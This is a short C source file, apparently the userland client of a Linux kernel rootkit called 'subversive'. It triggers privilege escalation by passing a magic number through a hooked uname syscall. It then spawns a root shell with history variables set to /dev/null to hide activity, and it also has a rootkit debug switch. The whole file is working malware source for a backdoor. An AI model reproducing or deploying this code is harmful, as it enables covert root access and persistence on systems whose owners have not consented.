#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <sys/syscall.h>

#include <subversive/config.h>

static struct option long_options[] = {
	{"root-shell", 0, 0, 0},
	{"debug-rk", 0, 0, 1},
	{0, 0, 0, 0}
};

void usage(const char *path)
{
	printf("%s [options]\n" \
		"\t--root-shell\t\tgive a root shell\n"			\
		"\t--debug-rk\t\t(for debugging purpose)\n"		\
		, path);
}

void root_shell(void)
{
	char *argv[] = { "/bin/sh", NULL };
	char *env[] = { "BASH_HISTORY=/dev/null", "HISTORY=/dev/null", "history=/dev/null", NULL };
	syscall(SYS_uname, MAGIC_NUMBER_GET_ROOT);
	if (getuid() == 0)
		execve(argv[0], argv, env);
}

void debug_rk(void)
{
	syscall(SYS_uname, MAGIC_NUMBER_DEBUG_RK);
}

int main(int argc, char **argv)
{
	int c, opt_idx;

	for (;;) {
		c = getopt_long(argc, argv, "h", long_options, &opt_idx);
		if (c == -1)
			break;

		switch (c) {
		case 'h':
			usage(argv[0]);
			return 0;
		case 0:
			root_shell();
			break;
		case 1:
			debug_rk();
			break;
		default:
			break;
		}
	}


	return 0;
}
